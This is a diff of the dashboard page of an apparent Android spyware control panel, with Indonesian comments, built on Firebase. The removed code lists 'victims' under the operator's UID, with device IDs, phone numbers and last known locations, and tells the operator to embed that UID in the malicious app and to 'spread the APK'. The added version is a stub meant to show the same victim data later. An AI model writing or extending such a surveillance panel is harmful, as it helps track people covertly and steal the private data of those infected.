@@ -1,83 +1,40 @@
-<!-- PATH: /dashboard.html -->
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dashboard - REU Panel</title>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <title>REU Panel - Dashboard</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="navbar">
-        <h2>REU Panel</h2>
+        <h2>📊 Dashboard</h2>
         <div>
-            <a href="dashboard.html">Dashboard</a>
-            <a href="profile.html">Profile</a>
+            <a href="dashboard.html">Home</a> |
+            <a href="profile.html">Profile</a> |
             <button onclick="logout()">Logout</button>
         </div>
     </div>
-
     <div class="container">
-        <h1>Selamat Datang, <span id="user-email">Loading...</span></h1>
-        <p>UID Kamu: <strong><span id="user-uid"></span></strong> <button onclick="copyUID()">Copy UID</button></p>
-        <p><i>UID ini yang bakal lo masukin ke file `app.json` di asset aplikasi victim nanti.</i></p>
-
-        <hr>
-
-        <h2>📱 Data Korban (Victims)</h2>
-        <div id="victims-list">Loading data korban...</div>
+        <h1>Selamat datang, <span id="user-email">...</span></h1>
+        <p>Ini adalah dashboard. Data victim akan muncul di sini (nanti di-loop dari Firebase).</p>
+        <div id="victim-list"></div>
     </div>
 
-    <script src="firebase-config.js"></script>
-    <script>
-        // Cek status login
-        auth.onAuthStateChanged(user => {
-            if (!user) {
-                window.location.href = 'index.html'; // Balik ke login kalo ga login
-            } else {
-                document.getElementById('user-email').innerText = user.email;
-                document.getElementById('user-uid').innerText = user.uid;
-                loadVictims(user.uid);
-            }
-        });
+    <script type="module">
+        import { auth, database, signOut, ref, onValue } from './firebase-config.js'; // Ganti onValue kalo perlu
+        import { get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        function logout() {
-            auth.signOut().then(() => {
+        const user = auth.currentUser;
+        if (!user) {
+            window.location.href = 'index.html'; // Kalo ga login, balik
+        } else {
+            document.getElementById('user-email').innerText = user.email;
+            // Di sini lo bisa fetch data victim berdasarkan UID user
+            // Contoh: fetch data dari /victims/{user.uid}
+        }
+
+        window.logout = function() {
+            signOut(auth).then(() => {
                 window.location.href = 'index.html';
-            });
-        }
-
-        function copyUID() {
-            const uid = document.getElementById('user-uid').innerText;
-            navigator.clipboard.writeText(uid);
-            alert('UID berhasil dicopy: ' + uid);
-        }
-
-        function loadVictims(uid) {
-            // Path di database: /victims/{uid attacker}/
-            const victimsRef = database.ref('victims/' + uid);
-            victimsRef.on('value', (snapshot) => {
-                const data = snapshot.val();
-                const container = document.getElementById('victims-list');
-                if (!data) {
-                    container.innerHTML = '<p>Belum ada korban. Sebar APK dulu, bro!</p>';
-                    return;
-                }
-
-                let html = '<table border="1" cellpadding="5"><tr><th>Device ID</th><th>Nama Device</th><th>Nomor HP</th><th>Lokasi Terakhir</th><th>Action</th></tr>';
-                for (let deviceId in data) {
-                    const victim = data[deviceId];
-                    html += `<tr>
-                        <td>${deviceId}</td>
-                        <td>${victim.deviceName || 'N/A'}</td>
-                        <td>${victim.phoneNumber || 'N/A'}</td>
-                        <td>${victim.lastLocation || 'N/A'}</td>
-                        <td><button onclick="alert('Fitur detail menyusul!')">Detail</button></td>
-                    </tr>`;
-                }
-                html += '</table>';
-                container.innerHTML = html;
             });
         }
     </script>
